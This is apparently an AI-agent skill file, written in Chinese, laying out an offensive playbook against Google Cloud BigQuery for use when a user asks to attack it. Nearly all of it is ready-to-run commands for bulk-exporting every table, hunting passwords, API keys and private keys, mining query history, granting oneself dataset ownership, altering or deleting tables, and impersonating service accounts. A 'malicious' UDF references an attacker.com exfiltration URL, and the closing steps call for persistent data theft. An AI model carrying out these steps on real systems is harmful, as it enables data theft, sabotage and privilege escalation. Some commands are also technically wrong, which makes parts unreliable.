---
name: gcp-bigquery-attack
type: attack
category: database
platform: gcp
severity: high
---

# GCP BigQuery 攻击技能

## 触发条件

- 有 GCP 凭证
- 目标使用 BigQuery
- 用户要求"攻击 BigQuery"

## 前置检查

```bash
# 1. 验证凭证
gcloud auth list

# 2. 列出数据集
bq ls --project_id PROJECT_ID

# 3. 列出表
bq ls PROJECT_ID:DATASET_ID
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试匿名访问
bq query --nouse_legacy_sql "SELECT * FROM `bigquery-public-data.usa_names.usa_1910_current` LIMIT 10"

# 2. 测试公开数据集
bq ls --project_id bigquery-public-data

# 3. 检查 ACL
bq show --dataset --format=prettyjson PROJECT_ID:DATASET_ID | jq '.access'
```

### 方法 2: 数据窃取

```bash
# 1. 列出所有数据集
bq ls --project_id PROJECT_ID

# 2. 列出所有表
bq ls --format=prettyjson PROJECT_ID:DATASET_ID | jq -r '.[].tableReference.tableId'

# 3. 读取表数据
bq query --nouse_legacy_sql "SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\` LIMIT 1000"

# 4. 导出数据到本地
bq query --nouse_legacy_sql "SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\`" > /tmp/data.csv

# 5. 导出所有表
for table in $(bq ls --format=prettyjson PROJECT_ID:DATASET_ID | jq -r '.[].tableReference.tableId'); do
  echo "Exporting $table"
  bq query --nouse_legacy_sql "SELECT * FROM \`PROJECT_ID.DATASET_ID.$table\`" > /tmp/$table.csv
done
```

### 方法 3: 敏感数据搜索

```bash
# 1. 搜索包含密码的表
bq query --nouse_legacy_sql "
  SELECT table_id, schema
  FROM \`PROJECT_ID.DATASET_ID.INFORMATION_SCHEMA.TABLES\`
  WHERE schema LIKE '%password%'
"

# 2. 搜索包含敏感列的表
bq query --nouse_legacy_sql "
  SELECT table_name, column_name
  FROM \`PROJECT_ID.DATASET_ID.INFORMATION_SCHEMA.COLUMNS\`
  WHERE column_name LIKE '%password%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%'
"

# 3. 搜索敏感数据
bq query --nouse_legacy_sql "
  SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\`
  WHERE column LIKE '%password%'
"
```

### 方法 4: 查询历史利用

```bash
# 1. 获取查询历史
bq ls -j --all

# 2. 查看特定查询
bq show -j JOB_ID

# 3. 获取查询详情
bq query --nouse_legacy_sql "
  SELECT * FROM \`region-us.INFORMATION_SCHEMA.JOBS\`
  WHERE project_id = 'PROJECT_ID'
  ORDER BY creation_time DESC
  LIMIT 100
"

# 4. 搜索包含敏感数据的查询
bq query --nouse_legacy_sql "
  SELECT query, user_email
  FROM \`region-us.INFORMATION_SCHEMA.JOBS\`
  WHERE query LIKE '%password%' OR query LIKE '%secret%'
"
```

### 方法 5: Dataset 权限提升

```bash
# 1. 获取 Dataset ACL
bq show --dataset --format=prettyjson PROJECT_ID:DATASET_ID | jq '.access'

# 2. 如果有 update 权限，添加自己
bq update --dataset --default_table_expiration 0 --dataset \
  --access "user:YOUR_EMAIL@DOMAIN.COM:OWNER" \
  PROJECT_ID:DATASET_ID

# 3. 给 Service Account 授权
bq update --dataset \
  --access "serviceAccount:SA@PROJECT_ID.iam.gserviceaccount.com:OWNER" \
  PROJECT_ID:DATASET_ID

# 4. 授予所有权限
bq update --dataset \
  --access "user:YOUR_EMAIL@DOMAIN.COM:OWNER,READER,WRITER" \
  PROJECT_ID:DATASET_ID
```

### 方法 6: 数据导出攻击

```bash
# 1. 导出到 GCS（如果有 GCS 权限）
bq extract --destination_format CSV \
  "PROJECT_ID:DATASET_ID.TABLE_NAME" \
  "gs://BUCKET_NAME/stolen-data/*.csv"

# 2. 导出多个表
for table in $(bq ls --format=prettyjson PROJECT_ID:DATASET_ID | jq -r '.[].tableReference.tableId'); do
  echo "Exporting $table to GCS"
  bq extract --destination_format CSV \
    "PROJECT_ID:DATASET_ID.$table" \
    "gs://BUCKET_NAME/stolen/$table-*.csv"
done

# 3. 压缩导出
bq extract --destination_format CSV \
  --compression GZIP \
  "PROJECT_ID:DATASET_ID.TABLE_NAME" \
  "gs://BUCKET_NAME/data.csv.gz"
```

### 方法 7: 表复制和数据篡改

```bash
# 1. 复制表到自己的项目
bq cp --project_id=SOURCE_PROJECT --dataset_id=SOURCE_DATASET \
  SOURCE_TABLE DESTINATION_PROJECT:DESTINATION_DATASET.TABLE_NAME

# 2. 创建恶意表
bq query --nouse_legacy_sql "
  CREATE TABLE \`PROJECT_ID.DATASET_ID.malicious_table\` AS
  SELECT * FROM \`PROJECT_ID.DATASET_ID.sensitive_table\`
"

# 3. 修改表数据
bq query --nouse_legacy_sql "
  UPDATE \`PROJECT_ID.DATASET_ID.TABLE_NAME\`
  SET sensitive_column = 'malicious_value'
  WHERE condition
"

# 4. 删除表
bq rm -f --project_id=PROJECT_ID --dataset_id=DATASET_ID TABLE_NAME
```

### 方法 8: UDF 利用

```bash
# 1. 创建恶意 UDF
cat > malicious.js <<'EOF'
function maliciousFunction(input) {
  // 将数据发送到攻击者服务器
  var url = "https://attacker.com/exfil?data=" + encodeURIComponent(input);
  // BigQuery UDF 不支持网络请求，但可以处理数据
  return input;
}
EOF

# 2. 上传 UDF 到 GCS
gsutil cp malicious.js gs://BUCKET_NAME/malicious.js

# 3. 创建 UDF
bq query --nouse_legacy_sql "
  CREATE TEMPORARY FUNCTION stealData(x STRING)
  RETURNS STRING
  LANGUAGE js AS '''
    // 处理敏感数据
    return x;
  '''
  OPTIONS (
    library = ['gs://BUCKET_NAME/malicious.js']
  );
"

# 4. 使用 UDF 查询敏感数据
bq query --nouse_legacy_sql "
  SELECT stealData(sensitive_column) FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\`
"
```

### 方法 9: 凭证窃取

```bash
# 1. 搜索包含凭证的表
bq query --nouse_legacy_sql "
  SELECT table_name
  FROM \`PROJECT_ID.DATASET_ID.INFORMATION_SCHEMA.COLUMNS\`
  WHERE column_name LIKE '%key%' OR column_name LIKE '%secret%'
"

# 2. 查找包含 API Key 的数据
bq query --nouse_legacy_sql "
  SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\`
  WHERE column LIKE 'AIza%'
"

# 3. 查找包含 Service Account Key 的数据
bq query --nouse_legacy_sql "
  SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\`
  WHERE column LIKE '-----BEGIN PRIVATE KEY-----%'
"
```

### 方法 10: 跨项目攻击

```bash
# 1. 枚举所有可访问的项目
bq ls --project_id

# 2. 检查公开数据集
bq ls --project_id bigquery-public-data
bq ls --project_id firebase-public-project

# 3. 访问其他项目
# 如果有跨项目访问权限
bq query --nouse_legacy_sql "
  SELECT * FROM \`ANOTHER_PROJECT.DATASET.TABLE\`
"

# 4. 使用 Service Account 访问多个项目
# 伪装成 SA
gcloud iam service-accounts impersonate SA_NAME@PROJECT_ID.iam.gserviceaccount.com
```

## 验证成功

```bash
# 成功列出数据集
bq ls --project_id PROJECT_ID

# 成功查询数据
bq query --nouse_legacy_sql "SELECT * FROM \`PROJECT_ID.DATASET_ID.TABLE_NAME\` LIMIT 10"

# 成功导出数据
bq extract --destination_format CSV \
  "PROJECT_ID:DATASET_ID.TABLE_NAME" \
  "/tmp/data.csv"
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用发现的凭证访问其他 GCP 服务
3. 通过 BigQuery 建立持续数据窃取
4. 攻击关联的数据存储系统
